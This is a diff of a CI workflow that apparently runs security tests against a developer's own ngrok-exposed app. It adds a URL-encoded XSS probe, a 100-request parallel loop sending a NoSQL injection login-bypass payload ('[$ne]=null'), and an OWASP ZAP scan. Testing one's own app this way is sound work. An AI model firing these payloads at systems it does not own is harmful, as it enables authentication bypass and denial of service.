@@ -21,12 +21,19 @@ jobs:
       - name: Simulate XSS Attack
         run: |
           echo "Executing Cross-Site Scripting (XSS) Attack..."
-          curl -X GET "https://9961-196-184-98-202.ngrok-free.app/search?query=<script>alert('XSS')</script>"
+          curl -X GET "https://9961-196-184-98-202.ngrok-free.app/search?query=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
+      - name: Simulate Load Test (Ethical DoS)
+        run: |
+          echo "Simulating light DoS (load test)..."
+          for i in {1..100}; do
+          curl -s -X POST https://9961-196-184-98-202.ngrok-free.app/login -d 'username[$ne]=null&password[$ne]=null' &
+          done
+          wait
 
       - name: Run OWASP ZAP Security Scan
         uses: zaproxy/action-baseline@v0.8.0
         with:
-          target: "https://your-ngrok-url.ngrok.io"
+          target: "https://9961-196-184-98-202.ngrok-free.app"
           fail_action: false
           rules_file_name: zap-rules.txt
 
